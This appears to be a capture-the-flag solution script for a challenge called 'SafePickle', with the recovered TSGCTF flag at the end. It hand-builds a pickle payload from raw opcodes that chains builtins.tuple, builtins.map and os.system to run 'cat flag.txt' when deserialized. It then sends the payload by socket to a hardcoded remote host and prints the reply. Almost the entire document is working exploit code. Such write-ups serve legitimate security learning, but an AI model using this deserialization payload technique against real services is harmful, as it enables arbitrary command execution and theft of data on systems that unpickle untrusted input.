# MISC SafePickle
import socket

PROTO = b'\x80\x04'
STACK_GLOBAL = b'\x93'
SHORT_BINUNICODE = b'\x8c'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'
NEWOBJ = b'\x81'
STOP = b'.'

def pack_str(s):
    return SHORT_BINUNICODE + bytes([len(s)]) + s.encode()

def solve():
    HOST = '35.194.98.181'
    PORT = 53117

    payload = b''
    payload += PROTO
    payload += pack_str("builtins") + pack_str("tuple") + STACK_GLOBAL
    payload += pack_str("builtins") + pack_str("map") + STACK_GLOBAL
    payload += pack_str("os") + pack_str("system") + STACK_GLOBAL
    payload += pack_str("cat flag.txt") + TUPLE1
    payload += TUPLE2
    payload += NEWOBJ
    payload += TUPLE1
    payload += NEWOBJ
    payload += STOP

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.recv(1024)
        s.sendall(payload.hex().encode() + b'\n')

        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            print(chunk.decode(errors='ignore'), end='')

    except Exception as e:
        print(e)
    finally:
        s.close()

if __name__ == "__main__":
    solve()


#FLAG: TSGCTF{Reduce();Reuse();Recycle()}